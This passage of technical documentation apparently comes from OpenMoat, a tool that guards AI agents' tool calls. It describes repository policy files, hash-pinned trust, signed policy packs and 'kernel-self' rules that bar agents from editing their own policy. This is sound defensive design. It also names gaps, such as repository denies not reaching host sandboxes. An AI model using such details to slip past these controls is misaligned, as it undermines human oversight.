To install a version released this week inside `moat run`, start `moat run` with
your own cut-off in the variable, or set the key to `0`.

## 10. Repository policy

A project can commit rules for everyone who works in it: `<project>/.moat/policy.yaml`,
where the project is the git root that `${project}` names (§3.2). A repository is input
you did not write, so by itself its policy can only make yours stricter. Its allow rules
apply only after you trust that exact file with `moat trust` (ADR-022).

```yaml
version: 1
deny:
  - id: no-prod-deploy
    shell: ["./scripts/deploy.sh prod*"]
ask:
  - id: migrations
    fs.write: ["${project}/db/migrations/**"]
```

- Only `version`, `deny`, `ask` and `allow` are accepted. `defaults`, `executables` and
  `sandbox` stay yours, and any other key is an error. Rules follow §1–§3.
- `deny` groups join your deny rules. `ask` groups are tried after your deny rules and
  before your allow rules. So they make an action your policy allows ask, but they
  never soften one of your denies. Per atomic action the result is the stricter of
  the two policies.
- `allow` groups are ignored until you trust the file. Trusted, they are added after
  your allow rules, so your deny rules (`secrets-paths`, `kernel-self`, …) still win.
  They can widen your `ask` rules and defaults.
- Every repository rule id is shown with the prefix `repo:` (`repo:no-prod-deploy`) in
  responses, the audit log and `moat show`. This way a repository rule cannot pose as
  one of yours.
- A file that cannot be read or parsed, that sets a key it may not set, or that is not
  a regular file denies every tool call in the project with `kernel-error` and the
  reason. Fix the file to go on. OpenMoat never ignores it, because ignoring it would
  silently drop the team's deny rules.
- `moat policy check` without `--policy` decides with it, as `guard` does. With
  `--policy`, only that file is used.
- Agents cannot change it: `kernel-self` denies writes to `**/.moat/**`.
- Hook only. Host sandboxes (§9) and `moat proxy` are generated from your policy,
  per user and not per repository. A repository deny is not enforced there, and a
  trusted repository allow does not widen them.

```bash
moat trust                   # trust the repository policy of the current directory's project
moat trust ~/code/app        # or of another project
moat trust --revoke          # its allow rules stop applying; deny and ask stay
```

`moat trust` prints each allow rule it lets in. It records the SHA-256 of the file's
bytes against the project root (symlinks resolved) in `~/.moat/trust.json`, never in
the repository, and re-pins the lock. The record holds for that exact file in that
exact checkout. After any change to the file (a pull, a branch switch, an edit), or for
a copy in another directory, the policy applies in its tightening-only form until you
run `moat trust` again. A file that does not parse cannot be trusted. Like `moat
allow`, `moat trust` must be run from a terminal, refuses while the lock shows drift
(exit 64), and is denied to agents by `kernel-self`. A `trust.json` the lock does not
pin is ignored.

Where your policy says `require_signed_repo_policy: true`, a signature decides instead
of `moat trust` (ADR-031). A repository policy's allow rules apply only when its
detached signature `<project>/.moat/policy.yaml.sig` verifies, with `ssh-keygen -Y verify`
in the namespace `openmoat-policy`, against a key you trusted with `moat policy trust-key`
(§11). A file with no signature, a signature from another key, or a change to the file
after signing is not trusted, even where you ran `moat trust`: its allow rules are
ignored and its deny and ask rules apply, as for any untrusted repository policy.
`moat trust` still records the file, and says that the setting overrides it. Without the
setting, which is the default, a signature changes nothing and `moat trust` alone
decides. The signature is checked on each call in the project, outside the agent's
sandbox.

`moat status` and `moat doctor`, run inside the project, name the repository policy and
its digest, and say which form applies: `trusted`, `trusted: signed by <name>`, `not trusted: tightening only`,
`changed since moat trust: tightening only`, `not signed by a trusted key: tightening only`
(with `require_signed_repo_policy: true`), or `tightening only` for a file without
allow rules. A file that does not parse is reported as a problem (exit 64), because
every call in the project is denied.

## 11. Signed policy packs

A policy pack is a team's rules that you install for every project (ADR-031). It has a
repository policy's shape (only `version`, `deny`, `ask` and `allow`, §10) and a
detached OpenSSH signature. OpenMoat has no signature code of its own: it runs the
system `ssh-keygen` (OpenSSH 8.1 or later), found through the environment snapshot
`moat init` records (§8.1), in the namespace `openmoat-policy`.

```bash
# whoever maintains the pack signs it
ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n openmoat-policy team.yaml   # writes team.yaml.sig

# each person trusts the maintainer's public key once, then installs the pack
moat policy trust-key alice.pub --name alice@example.com
moat policy install team.yaml               # the signature defaults to team.yaml.sig
moat policy install team.yaml --sig other.sig --name team
moat policy remove team
```

- `moat policy trust-key` checks the key with `ssh-keygen -l`, prints its fingerprint,
  and adds it to `~/.moat/allowed_signers` for the namespace `openmoat-policy` only, so
  a key's signature over anything else (a git commit) is never a policy signature.
- `moat policy install` verifies the signature over the exact bytes it then installs.
  A signature that does not verify, or one from a key you did not trust, is refused
  (exit 64) and nothing is written. The pack and its signature are copied to
  `~/.moat/policy.d/packs/<name>.yaml` and `.yaml.sig`, and recorded with their SHA-256
  and signer in `~/.moat/packs.json`. Installing a pack again under the same name
  replaces it.
- The pack's rules merge like a trusted repository policy's, under the prefix
  `pack:<name>:` (`pack:team:no-deploy`): its deny rules join yours, its ask rules are
  tried before your allow rules, and its allow rules are added after yours, so your
  deny rules still win. Deny and allow rules also reach the host sandboxes at the next
  `moat sandbox sync`; ask rules are hook only.
- The allowed signers, `packs.json` and each installed pack are pinned by the lock
  (§8). A pack changed after install is drift, and every call is denied with
  `kernel-integrity`. Only these three commands add those pins; another re-pin keeps
  them and never adds them, so a file planted there is not trusted. An unpinned
  `allowed_signers` or `packs.json` is ignored.
- All three commands must be run from a terminal, refuse while the lock shows drift, and
  are denied to agents by `kernel-self` (`moat policy *`). Without `ssh-keygen` they
  refuse with a message saying so; nothing else changes.
